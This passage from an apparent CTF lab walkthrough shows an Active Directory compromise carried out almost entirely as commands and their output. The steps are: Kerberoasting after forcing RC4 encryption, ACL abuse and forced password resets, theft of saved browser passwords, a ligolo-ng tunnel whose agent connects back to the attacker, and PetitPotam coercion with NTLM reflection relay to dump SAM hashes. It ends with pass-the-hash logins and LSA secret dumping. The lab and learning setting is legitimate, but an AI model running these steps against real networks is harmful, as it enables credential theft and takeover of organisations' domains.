But the hash for `m.lee` is using a stronger encrpytion type, but since i have GenericWrite i should have the permission to downgrade the encrpytion type!

```python
bloodyAD --host dc.novaforge.local -d novaforge.local -k get writable --detail

...[SNIP]...

distinguishedName: CN=m.lee,CN=Users,DC=novaforge,DC=local
msDS-SupportedEncryptionTypes: WRITE
```

As seen here i can write to it!

```python
bloodyAD --host dc.novaforge.local -d novaforge.local -k set object 'm.lee' 'msDS-SupportedEncryptionTypes' -v '4'
[+] m.lee's msDS-SupportedEncryptionTypes has been updated
```

Ive changed the value to 4 which represents the RC4 algorithm

```python
nxc ldap dc.novaforge.local -u john.doe -p 'johndoe1369' --kerberoasting kerb.hash
LDAP        10.0.0.100      389    DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:novaforge.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.0.0.100      389    DC               [+] novaforge.local\john.doe:johndoe1369 
LDAP        10.0.0.100      389    DC               [*] Skipping disabled account: krbtgt
LDAP        10.0.0.100      389    DC               [*] Total of records returned 2
LDAP        10.0.0.100      389    DC               [*] sAMAccountName: svc_it_admin, memberOf: CN=Protected Users,CN=Users,DC=novaforge,DC=local, pwdLastSet: 2026-06-20 00:17:08.000373, lastLogon: <never>
LDAP        10.0.0.100      389    DC               $krb5tgs$18$svc_it_admin$NOVAFORGE.LOCAL$*novaforge.local\svc_it_admin*$03ba325a8570e122a76301bb$94dbd6e4fa2fdfee0f34a89d15dc96a8ef821362cfe3087d7036a470ad7a87c0d74543da1169a1ee148e789e695e928c6b06e8f8f60c1172304b4422f11cc6fece854d1cfbc8770284cf02e15954363a5d250b2c5dd356f4d713c7a76a93e271b8a54abe7ad809b065c1cb3bc846a6a2cbaa586e6e1412de9a5325d31502fe833afa19aa9fafa8f596bfa29ff7bd58c38b31c9b39a591be918de9cc5f02156f98ff50cd2f3acca656eae3ad5545e3f95230b33cf7da9eb908a13f5b4e578021e90579a355357bb8cdc20e9527059e6f14f186fbd9008e0561518b9b638b4185261cd9659c3e2f6d993aaba2719985e6144bbcaad6eb70771625dbde7f41fa5632a37561d7dbe68ea1e375eb15d69bc3c3cd1be0899feb2f06b854dfef2f55a87ee0ddcfd03ab829e7c7fb3f93d91a8a3c618849dcdc82790d037ebee155a34197500ea6562a8372c8090e5382c3d8960a6201bb49f1da30a1ac5added4b5f529d74c0ba0f4ca5de77500bc078688b04f7f291cc55a76c142722fdaa84e8392eac60c5d9e57993d385ec1330a329ec364f1bdfbd2dd3ade4cc65ff0d8e1a196ea4b2d00ca7898f9b4f5733e7c795b964dd9a91136fa1898bb24acd2ede4d66071a5815c3aeace1ab32233d912ac8a113a3029411a7c39e32e351073d0c685c3ffdd6be96a07bddce006db1683bce4d90163d98dd051ac03251d5b5ae9d50fc8db0390259013cf35d08a35648c17eee61dc5b692a340db3f973569f4f0de9ef70123cdb3e796f9f53d01c622c27a8497f2b9731be285d9f4042553940c5291f1dbde12c8e0448bbbcc39d58411d30a0019063994efc5bba6a8fc4c2dbd2e5f945a5b676ddfeb0e08add415afdc704f79db7b681720f789366c3cb45ea8a49a6572860b038230fb748c7050166fcc26aa998b834c85fc077bf0ee47ce90b5c88884d8a3745240ccd007878fc0b18975eea5ceed49c917b9e61d6b67357de37bec5f8faa8530e213fa31d6815345a72f2d62710250589cd861dd460d137a663ea24b37573a83f4bb57deb789c4f3e951d41ebef79ff48c95cea44dce9ad3464dd358faee6cd5d972e6f5a7408d816acae68269d034c75270dd182e93bfa2a9becb0bdf7b5145c88d258bc4043e2c80c9ef4bb7cd4d84bc5315785fc73493e56a803117013f751e8a7d6d7743db85a678b9bfbe4b9560a9ec479278fc6e61bf5008646f0aabb4940ef4e605b87c495b8946d75af7572890cafbcce953bb965836e1dfba4c1f10430a645aa78994c7e9c09a25807224f39a706558a389903e76040be58d8d40a19638f929a0b3039e00548311d6183ff1639801fbc584d201a47536615f737fb2d763ab5f9fa0c7e0fced255009554c9bf7426a0939e0ced4c441251c44fd8995026502159d90cf458a75b768ef0d9c4f8eeaab448c4d979e6203bda7879ecaa49b68418bf73bc70701531c207f53c47a317a8c101d7c5ba6d5c3aa4e8448d60d621fe02d
LDAP        10.0.0.100      389    DC               [*] sAMAccountName: m.lee, memberOf: [], pwdLastSet: 2026-06-20 11:34:08.435707, lastLogon: <never>
LDAP        10.0.0.100      389    DC               $krb5tgs$23$*m.lee$NOVAFORGE.LOCAL$novaforge.local\m.lee*$6a4d27495c85698c8b4183e0417e0c63$8af7ca11b191083176730fd15909baf93ea004f779d56fe6b29b5099ebb7783a5c2ad6a3f331b9430f8491af8e3ed115250c22b07c18e2225f87045293ee665cc19596e4e42cdaa491b01d475a10036946c5aa6ea9a99fb871c284bd321164539c88424e46d24296890ca7474836802e72d99d1d7bb13ddeed6b9b64da11e3c72ba33eb766fa9b6c517a0ca1719c1e6d8e599e2277a27723474a4bbb4e4d38bb6352a1cc3207438bd501eb329d356155c1cc7a2649b941503f155a9e0d620349b6d4d3cf481d6647a120c7a45a89bde36ea64f509dba58b9143c0649416a93432143d78b70d5e92eae17c6bd96f6ee329bdbc341415223e6196edbed01cc47f8d5ddaf802d6e485d114241e811c19894920d0351aa58f01e9b118009aa0a83ac1c8648cf2ab8743973ae2b5d30b458abf192409cd2f4d0edcc4a5e2b126c809518250e643205ca3fb58f72bf97bd02f71b410f89980318afcde04906e2e0c33bb21fb668fddd03769246e79195f8a4d50995507d916ea84341af5c668a6d781ef667cf43b990fa5e832c4d791251e8daffcb64f71bbbd44a0792605bd8b48b0afc8e452203d5c95ff4ab9841e35fa3834b64828ac983f4c53e1b7a55b752caa5ce03a3177a75973e30667d56c2ae3d32239845dfa8aedf733aa8c57eee91ca562efc1b4f16e853025aca1eb84aba79821d8fb8f1bea6daa8f5aababca3c785ee8c1d2aec0e4fae2c2741c34f6f16fca36381e29c89ce537cbba6e8b9221db1ac68d77ebd7826d79a5a6bd7f8e869bc288d9e77c66ebabb888ab8681547d76460c8e3f0a2dae4de02df61eddcbe3555b7cb7b8a86cb9fb0bc2e33d14d51306dcc97913d2041a05bd8f4521c70e68ace3872fa34a5f81fca659b54ebbdfcfcd62de00277c77d4d9a593ee1cb5b525ccdae8e0bea0d07c3ed2bd46e5969fce02a7df4158c5811715c33a3909138c0d3cb537c30e9597bf444bdd3a094ebffe812e1948779be8c3d3be684bf5f377324d543513e779e06abb4f3130c256cda18905885be43978006a9383cebe041a0896e357f5401186d8e2ad0c6dda83d40bb92498f352f41f3c9289735dd2b4633ea9da13443d9f956def3d5807d6bce94cacf84106774aa67674f58d1f55ebeade3552f5c74fccdf0a77931745ec225b8fe2085cb11d35cc26bb53dc8af38c5e1f2ae8fcb83fceef2c3c7d591f5ccd4b8b81bd3b89a7efeba352d6dfc11d327c0c5e345a6c9096fc65aa73672b9a27515d60da993886f601da26c2662af1a55fd1c5acb2b83408a95a5205b880345ace73b3f8efa5ed4e697154eaa014df43b63f0217766a23243096897f87124695ea505713a7869be3549a01528b8ebdb65a3b473ddf68766c1ddaf199215f8778270abc28089aef028fce5cc2caa3bf02d6dfa80b75b85c60e25e74ff0158c8b12f233271d54b4bcc87e6e4739fbca1e707328126f043bfdb257596453
```

Now ill re run the command to get the new hash with the downgraded algorithm

```python
hashcat mlee.hash /usr/share/wordlists/rockyou.txt

$krb5tgs$23$*m.lee$NOVAFORGE.LOCAL$novaforge.local\m.lee*$6a4d27495c85698c8b4183e0417e0c63$8af7ca11b191083176730fd15909baf93ea004f779d56fe6b29b5099ebb7783a5c2ad6a3f331b9430f8491af8e3ed115250c22b07c18e2225f87045293ee665cc19596e4e42cdaa491b01d475a10036946c5aa6ea9a99fb871c284bd321164539c88424e46d24296890ca7474836802e72d99d1d7bb13ddeed6b9b64da11e3c72ba33eb766fa9b6c517a0ca1719c1e6d8e599e2277a27723474a4bbb4e4d38bb6352a1cc3207438bd501eb329d356155c1cc7a2649b941503f155a9e0d620349b6d4d3cf481d6647a120c7a45a89bde36ea64f509dba58b9143c0649416a93432143d78b70d5e92eae17c6bd96f6ee329bdbc341415223e6196edbed01cc47f8d5ddaf802d6e485d114241e811c19894920d0351aa58f01e9b118009aa0a83ac1c8648cf2ab8743973ae2b5d30b458abf192409cd2f4d0edcc4a5e2b126c809518250e643205ca3fb58f72bf97bd02f71b410f89980318afcde04906e2e0c33bb21fb668fddd03769246e79195f8a4d50995507d916ea84341af5c668a6d781ef667cf43b990fa5e832c4d791251e8daffcb64f71bbbd44a0792605bd8b48b0afc8e452203d5c95ff4ab9841e35fa3834b64828ac983f4c53e1b7a55b752caa5ce03a3177a75973e30667d56c2ae3d32239845dfa8aedf733aa8c57eee91ca562efc1b4f16e853025aca1eb84aba79821d8fb8f1bea6daa8f5aababca3c785ee8c1d2aec0e4fae2c2741c34f6f16fca36381e29c89ce537cbba6e8b9221db1ac68d77ebd7826d79a5a6bd7f8e869bc288d9e77c66ebabb888ab8681547d76460c8e3f0a2dae4de02df61eddcbe3555b7cb7b8a86cb9fb0bc2e33d14d51306dcc97913d2041a05bd8f4521c70e68ace3872fa34a5f81fca659b54ebbdfcfcd62de00277c77d4d9a593ee1cb5b525ccdae8e0bea0d07c3ed2bd46e5969fce02a7df4158c5811715c33a3909138c0d3cb537c30e9597bf444bdd3a094ebffe812e1948779be8c3d3be684bf5f377324d543513e779e06abb4f3130c256cda18905885be43978006a9383cebe041a0896e357f5401186d8e2ad0c6dda83d40bb92498f352f41f3c9289735dd2b4633ea9da13443d9f956def3d5807d6bce94cacf84106774aa67674f58d1f55ebeade3552f5c74fccdf0a77931745ec225b8fe2085cb11d35cc26bb53dc8af38c5e1f2ae8fcb83fceef2c3c7d591f5ccd4b8b81bd3b89a7efeba352d6dfc11d327c0c5e345a6c9096fc65aa73672b9a27515d60da993886f601da26c2662af1a55fd1c5acb2b83408a95a5205b880345ace73b3f8efa5ed4e697154eaa014df43b63f0217766a23243096897f87124695ea505713a7869be3549a01528b8ebdb65a3b473ddf68766c1ddaf199215f8778270abc28089aef028fce5cc2caa3bf02d6dfa80b75b85c60e25e74ff0158c8b12f233271d54b4bcc87e6e4739fbca1e707328126f043bfdb257596453:0816mypassword
```

Ill place only `m.lee` hash in a file, then it cracks!

```python
nxc smb dc.novaforge.local -u m.lee -p '0816mypassword' --smb-timeout 5                       
SMB         10.0.0.100      445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:novaforge.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.0.100      445    DC               [+] novaforge.local\m.lee:0816mypassword
```

This user is now compromised!

# Compromising `steve.wills`

![](Pasted%20image%2020260807181410.png)

The user `m.lee` has WriteDACL on the user `steve.wills` which means i can give myself full control (GenericAll)

```python
dacledit.py -action 'write' -rights 'FullControl' -principal 'm.lee' -target 'steve.wills' 'novaforge.local'/'m.lee':'0816mypassword'
Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20260807-181551.bak
[*] DACL modified successfully!
```

This granted me GenericAll over this user

```python
bloodyAD --host dc.novaforge.local -d novaforge.local -u m.lee -p '0816mypassword' set password 'steve.wills' 'Password123!'
[+] Password changed successfully!
```

Since its a lab environment, ill just change the users password!

```python
nxc smb dc.novaforge.local -u steve.wills -p 'Password123!' --smb-timeout 5
SMB         10.0.0.100      445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:novaforge.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.0.100      445    DC               [+] novaforge.local\steve.wills:Password123!
```

This user is now compromised!

![](Pasted%20image%2020260807181925.png)

The new user has WriteOwner over this group

# Abusing `WriteOwner` on the `it support users` group

```python
impacket-owneredit -action write -new-owner 'steve.wills' -target-dn 'CN=IT SUPPORT USERS,CN=USERS,DC=NOVAFORGE,DC=LOCAL' 'novaforge.local'/'steve.wills':'Password123!' -dc-ip 10.0.0.100
Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-4040438430-749096805-303184635-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=novaforge,DC=local
[*] OwnerSid modified successfully!
```

First ill take ownership of the group

```python
dacledit.py -action 'write' -rights 'WriteMembers' -principal 'steve.wills' -target-dn 'CN=IT SUPPORT USERS,CN=USERS,DC=NOVAFORGE,DC=LOCAL' 'novaforge.local'/'steve.wills':'Password123!'
Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20260807-182721.bak
[*] DACL modified successfully!
```

Then ill give myself the ability to add members to the group

```python
bloodyAD --host dc.novaforge.local -d novaforge.local -u steve.wills -p 'Password123!' add groupMember 'IT SUPPORT USERS' 'steve.wills'
[+] steve.wills added to IT SUPPORT USERS
```

Now ive added myself to the group!

![](Pasted%20image%2020260807182956.png)

I now have ForceChangePassword on 4 different users

The user `noah.sanders` looks the most interesting, since he has 8 outbound object control!

# Compromising `noah.sanders` then `steve.miller`

The user `noah.sanders` has GenericAll over the `IT support` OU with 7 members which of course gives GenericAll over those users as well due to inheritance

Out of those 7 users, `steve.miller` looks the most interesting since he has outbound object control and the others dont!

```python
bloodyAD --host dc.novaforge.local -d novaforge.local -u steve.wills -p 'Password123!' set password 'noah.sanders' 'Password123!'
[+] Password changed successfully!
```

First ill change the password for `noah.sanders` 

```python
bloodyAD --host dc.novaforge.local -d novaforge.local -u noah.sanders -p 'Password123!' set password 'steve.miller' 'Password123!'
[+] Password changed successfully!
```

Then ill change the password for `steve.miller` 

```python
nxc smb storage.novaforge.local -u steve.miller -p 'Password123!' --smb-timeout 5    
SMB         10.0.0.101      445    STORAGE          [*] Windows 11 / Server 2025 Build 26100 x64 (name:STORAGE) (domain:novaforge.local) (signing:True) (SMBv1:None)
SMB         10.0.0.101      445    STORAGE          [+] novaforge.local\steve.miller:Password123!
```

Now this user is compromised!

![](Pasted%20image%2020260807183950.png)

Now as `steve.miller` i have `GenericAll` over the `TIER1-SUPPORT` OU

# Applying inheritance to `TIER1-SUPPORT` OU

> The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket's dacledit

```python
dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'steve.miller' -target-dn 'OU=TIER1-SUPPORT,DC=NOVAFORGE,DC=LOCAL' 'novaforge.local'/'steve.miller':'Password123!'
Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20260807-184447.bak
[*] DACL modified successfully!
```

So now the GenericAll privilege should extend to child nodes

![850](Pasted%20image%2020260807184546.png)

So now i should have the ability to change the passwords of both of these users!

![523](Pasted%20image%2020260807184658.png)

![527](Pasted%20image%2020260807184733.png)

Both users in this OU are part of Remote Management which mean i can WINRM either way 

But both users are apart of a different group

Neither group has any description in bloodhound, so i think the safe move might be to compromise both and see what privs i have!

# Compromising `ryan.collins` and `daniel.brooks`

Since i have applied a inheritance rule to the OU the connect childs user accounts should also have GenericAll so ill just change their passwords

```python
bloodyAD --host dc.novaforge.local -d novaforge.local -u steve.miller -p 'Password123!' set password 'ryan.collins' 'Password123!' 
[+] Password changed successfully!
```

This changed the password of `ryan.collins`

```python
bloodyAD --host dc.novaforge.local -d novaforge.local -u steve.miller -p 'Password123!' set password 'daniel.brooks' 'Password123!' 
[+] Password changed successfully!
```

This changed the password of `daniel.brooks`

Now ill attempt to connect to winrm on both users to find the user flag!

I found the user flag in `daniel.brooks` desktop

# Enumeration of `ryan.collins` and `daniel.brooks`

```python
bloodyAD --host dc.novaforge.local -d novaforge.local -u daniel.brooks -p 'Password123!' get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=novaforge,DC=local
permission: WRITE

distinguishedName: CN=daniel.brooks,OU=Tier1-Support,DC=novaforge,DC=local
permission: WRITE

distinguishedName: DC=novaforge.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=novaforge,DC=local
permission: CREATE_CHILD; WRITE

distinguishedName: DC=_msdcs.novaforge.local,CN=MicrosoftDNS,DC=ForestDnsZones,DC=novaforge,DC=local
permission: CREATE_CHILD
```

This user has write on `DC=novaforge.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=novaforge,DC=local` which could be interesting

BloodyAD doesnt reveal anything for ryan

But the user `ryan.collins` can winrm on both the DC and the storage server which daniel cannot do

```python
nxc winrm storage.novaforge.local -u ryan.collins -p 'Password123!'
WINRM       10.0.0.101      5985   STORAGE          [*] Windows 11 / Server 2025 Build 26100 (name:STORAGE) (domain:novaforge.local) 
WINRM       10.0.0.101      5985   STORAGE          [+] novaforge.local\ryan.collins:Password123! (Pwn3d!)

nxc winrm storage.novaforge.local -u daniel.brooks -p 'Password123!' 
WINRM       10.0.0.101      5985   STORAGE          [*] Windows 11 / Server 2025 Build 26100 (name:STORAGE) (domain:novaforge.local) 
WINRM       10.0.0.101      5985   STORAGE          [-] novaforge.local\daniel.brooks:Password123!
```

So i can use `ryan.collins` to get access to the storage server!

```python
*Evil-WinRM* PS C:\Users\daniel.brooks\Desktop> dir


    Directory: C:\Users\daniel.brooks\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/20/2026   4:36 AM           1479 Opera Browser.lnk
-a----         6/28/2026  12:25 PM           8528 user.txt


*Evil-WinRM* PS C:\Users\daniel.brooks\Desktop>
```

Looks like this user has opera installed!

# Dumping credentials from Opera browser as `daniel.brooks`

https://github.com/moonD4rk/HackBrowserData

Ill download the latest release for windows x64

```python
*Evil-WinRM* PS C:\Users\daniel.brooks\Desktop> upload hack-browser-data.exe
                                        
Info: Uploading /home/kali/hsm/novaforge/hack-browser-data.exe to C:\Users\daniel.brooks\Desktop\hack-browser-data.exe
                                        
Data: 14959956 bytes of 14959956 bytes copied
                                        
Info: Upload successful!
```

Ill upload it via WINRM

```python
*Evil-WinRM* PS C:\Users\daniel.brooks\Desktop> .\hack-browser-data.exe -d . -b opera -p "C:\Users\daniel.brooks\AppData\Roaming\Opera Software\Opera Stable"
hack-browser-data.exe : [INF] Extracting Opera...
    + CategoryInfo          : NotSpecified: ([INF] Extracting Opera...:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
[INF] Exported to ./[INF]   password.json            3 entries[INF]   cookie.json              3 entries[INF]   history.json             12 entries[INF]   bookmark.json            1 entries[INF]   exten
```

Now running it i get a load of files back, which i can look through!

```python
*Evil-WinRM* PS C:\Users\daniel.brooks\Desktop> type password.json
[
  {
    "browser": "Opera",
    "profile": "Default",
    "url": "https://www.linux.org/",
    "username": "guru1337",
    "password": "linuXp0wEr",
    "created_at": "2026-06-20T04:41:33.354654Z"
  },
  {
    "browser": "Opera",
    "profile": "Default",
    "url": "https://fakebook.com/",
    "username": "daniel1990",
    "password": "password1990",
    "created_at": "2026-06-20T04:41:19.107529Z"
  },
  {
    "browser": "Opera",
    "profile": "Default",
    "url": "http://127.0.0.1:5000/",
    "username": "chuck.harrys",
    "password": "666chucky",
    "created_at": "2026-06-20T04:41:01.205401Z"
  }
]
*Evil-WinRM* PS C:\Users\daniel.brooks\Desktop>
```

Ive found some passwords!

The other files are not helpful

```python
linuXp0wEr
password1990
666chucky
```

Found three passwords!

# Password spray leads to user compromise

```python
nxc smb dc.novaforge.local -u users.txt -p '666chucky' --smb-timeout 3 --continue-on-success

SMB         10.0.0.100      445    DC               [+] novaforge.local\chuck.harrys:666chucky
```

This user is compromised!

The other passwords dont compromise any other  users, but they could still come in handy later on!


![](Pasted%20image%2020260807193431.png)

This user is a member of the storage portal admins group, so my thinking is this is for the internal web service i found earlier running on the storage server

# Internal web service running on storage server

```python
*Evil-WinRM* PS C:\Users\ryan.collins\Documents> netstat -ano | findstr 'LISTENING'

  TCP    0.0.0.0:5000           0.0.0.0:0              LISTENING       4
```

So ill go back to winrm as the `ryan.cooper` user since he can winrm to storage

And i see there is an internal web service running!

I can use ligolo-ng to forward the service externally

https://github.com/nicocha30/ligolo-ng/releases

```python
sudo ./proxy -selfcert
```

First of all ill download the windows agent and the linux proxy from github and then start up the proxy on my kali machine

```python
ligolo-ng » ifcreate --name novaforge
INFO[0112] Creating a new novaforge interface...        
INFO[0112] Interface created!                           
ligolo-ng » route_add --name novaforge --route 240.0.0.1/32
INFO[0138] Route created.                               
ligolo-ng »
```

Ill then set up the interface and set the routing info `240.0.0.1/32` is the address ligolo uses for localhost

```python
*Evil-WinRM* PS C:\Users\ryan.collins\Documents> upload agent.exe
                                        
Info: Uploading /home/kali/hsm/novaforge/agent.exe to C:\Users\ryan.collins\Documents\agent.exe
                                        
Data: 9800360 bytes of 9800360 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\ryan.collins\Documents>
```

Ill then upload the agent via winrm on the storage server

```python
*Evil-WinRM* PS C:\Users\ryan.collins\Documents> ./agent.exe -connect 192.168.211.2:11601 --ignore-cert
```

Then ill execute the agent to connect back to me, port `11601` is the default listening port for ligolo

```python
ligolo-ng » INFO[0280] Agent joined.                                 id=0e8e17f72bdb name="NOVAFORGE\\ryan.collins@STORAGE" remote="10.0.0.101:49863"
ligolo-ng » 
ligolo-ng » session
? Specify a session : 1 - NOVAFORGE\ryan.collins@STORAGE - 10.0.0.101:49863 - 0e8e17f72bdb
[Agent : NOVAFORGE\ryan.collins@STORAGE] » tunnel_start --tun novaforge
INFO[0355] Starting tunnel to NOVAFORGE\ryan.collins@STORAGE (0e8e17f72bdb) 
[Agent : NOVAFORGE\ryan.collins@STORAGE] »
```

Then soon after i get a agent joined alert, in which case i can selection session using the `session` command then start the tunnel!

![1099](Pasted%20image%2020260808164255.png)

I now have access to the internal web service!

Looks like there is also an admin portal, so ill try `chuck.harrys` creds to see if they get me access!

![](Pasted%20image%2020260808164527.png)

The login portal is also a native portal!

![902](Pasted%20image%2020260808165057.png)

The credentials do get me access!

I also have the capability to disable SMB signing on the storage server

# NTLM Relay leads to local admin on the storage server

First ill disable SMB signing via the web interface

https://www.depthsecurity.com/blog/using-ntlm-reflection-to-own-active-directory/

```python
bloodyAD --host dc.novaforge.local -d novaforge.local -u daniel.brooks -p 'Password123!' add dnsRecord --dnstype A localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA 192.168.211.2 
[+] localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA has been successfully added
```

First ill add the DNS record using `daniel.brooks` creds since he is a dns admin

```python
ntlmrelayx.py -smb2support -t smb://storage.novaforge.local
Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client RPC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client WINRMS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Setting up MSSQL Server on port 1433
[*] Setting up RDP Server on port 3389
[*] Multirelay disabled

[*] Servers started, waiting for connections
```

Ill then set up ntlm relay to relay the authentication

```python
nxc smb storage.novaforge.local -u ryan.collins -p 'Password123!' -M coerce_plus -o ALWAYS=true LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
SMB         10.0.0.101      445    STORAGE          [*] Windows 11 / Server 2025 Build 26100 x64 (name:STORAGE) (domain:novaforge.local) (signing:True) (SMBv1:None)
SMB         10.0.0.101      445    STORAGE          [+] novaforge.local\ryan.collins:Password123! 
COERCE_PLUS 10.0.0.101      445    STORAGE          VULNERABLE, PetitPotam
COERCE_PLUS 10.0.0.101      445    STORAGE          Exploit Success, efsrpc\EfsRpcAddUsersToFile
COERCE_PLUS 10.0.0.101      445    STORAGE          Exploit Success, efsrpc\EfsRpcAddUsersToFileEx
COERCE_PLUS 10.0.0.101      445    STORAGE          Exploit Success, efsrpc\EfsRpcDecryptFileSrv
COERCE_PLUS 10.0.0.101      445    STORAGE          Exploit Success, efsrpc\EfsRpcDuplicateEncryptionInfoFile
COERCE_PLUS 10.0.0.101      445    STORAGE          Exploit Success, efsrpc\EfsRpcEncryptFileSrv
COERCE_PLUS 10.0.0.101      445    STORAGE          Exploit Success, efsrpc\EfsRpcEncryptFileSrv
COERCE_PLUS 10.0.0.101      445    STORAGE          Exploit Success, efsrpc\EfsRpcFileKeyInfo
COERCE_PLUS 10.0.0.101      445    STORAGE          Exploit Success, efsrpc\EfsRpcQueryRecoveryAgents
COERCE_PLUS 10.0.0.101      445    STORAGE          Exploit Success, efsrpc\EfsRpcQueryUsersOnFile
COERCE_PLUS 10.0.0.101      445    STORAGE          Exploit Success, efsrpc\EfsRpcOpenFileRaw
COERCE_PLUS 10.0.0.101      445    STORAGE          VULNERABLE, MSEven
```

Then ill get the storage server to relay authentication back to itself

> NOTE: for some reason nxc is still saying smb signing is on, not sure why?

```python
[*] (SMB): Connection from 10.0.0.101 controlled, but there are no more targets left!
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d5cad8a9782b2879bf316f56936f1e36:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7490f2a63d713a813eda5bf8fd1a8227:::
```

Now back on ntlmrelayx i have the SAM hive and the local admin hash!

# Access as the local admin on the storage server

```python
evil-winrm -i storage.novaforge.local -u administrator -H 'd5cad8a9782b2879bf316f56936f1e36'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

I now have access as the local admin!

# Credentials stored in powershell history

```python
*Evil-WinRM* PS C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> cat ConsoleHost_history.txt
ipconfig
Install-WindowsFeature ``
    Web-Server,`
    Web-Asp-Net45,`
    Web-Net-Ext45,`
    Web-ISAPI-Ext,`
    Web-ISAPI-Filter ``
    -IncludeManagementTools
net user david.cokx "pa$$word12"
```

Found a password in the console history

```python
nxc smb dc.novaforge.local -u david.cokx -p 'pa$$word12' --smb-timeout 4
SMB         10.0.0.100      445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:novaforge.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.0.100      445    DC               [+] novaforge.local\david.cokx:pa$$word12
```

This user is compromised

```python
bloodyAD --host dc.novaforge.local -d novaforge.local -u david.cokx -p 'pa$$word12' get writable     

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=novaforge,DC=local
permission: WRITE

distinguishedName: CN=Protected Users,CN=Users,DC=novaforge,DC=local
permission: WRITE

distinguishedName: CN=david.cokx,CN=Users,DC=novaforge,DC=local
permission: WRITE

distinguishedName: DC=_msdcs.novaforge.local,CN=MicrosoftDNS,DC=ForestDnsZones,DC=novaforge,DC=local
permission: CREATE_CHILD
```

This new user has write access on protected users, i saw earlier on the password spray there was a user with a restriction which a lot of the time means they are part of protected users

# Removing `svc_it_admin` from `protected users`

```python
bloodyAD --host dc.novaforge.local -d novaforge.local -u david.cokx -p 'pa$$word12' remove groupMember 'Protected Users' 'svc_it_admin'
[+] svc_it_admin removed from Protected Users
```

So using the privs of `david.kocx` i can remove the user from the group!

# Dumping LSA secrets from the storage server

```python
nxc smb storage.novaforge.local -u Administrator -H 'd5cad8a9782b2879bf316f56936f1e36' --lsa --smb-timeout 5 --local-auth
SMB         10.0.0.101      445    STORAGE          [*] Windows 11 / Server 2025 Build 26100 x64 (name:STORAGE) (domain:STORAGE) (signing:True) (SMBv1:None)
SMB         10.0.0.101      445    STORAGE          [+] STORAGE\Administrator:d5cad8a9782b2879bf316f56936f1e36 (Pwn3d!)
SMB         10.0.0.101      445    STORAGE          [*] Dumping LSA secrets
SMB         10.0.0.101      445    STORAGE          NOVAFORGE.LOCAL/chuck.harrys:$DCC2$10240#chuck.harrys#548de7f8007a55c9781711930952dc56: (2026-08-08 15:42:22)
SMB         10.0.0.101      445    STORAGE          NOVAFORGE.LOCAL/frank.white:$DCC2$10240#frank.white#d61f1c3785b09b5e705d61d5b1189656: (2026-08-08 15:28:27)
SMB         10.0.0.101      445    STORAGE          NOVAFORGE\STORAGE$:aes256-cts-hmac-sha1-96:8423cd6d885767de1c1a8594d62ffd520edb212f7f59ec4fb097a4361869d349
SMB         10.0.0.101      445    STORAGE          NOVAFORGE\STORAGE$:aes128-cts-hmac-sha1-96:693f9b8c9551e9fa4254aa728f5e5de2
SMB         10.0.0.101      445    STORAGE          NOVAFORGE\STORAGE$:des-cbc-md5:58161c7a46a4f219
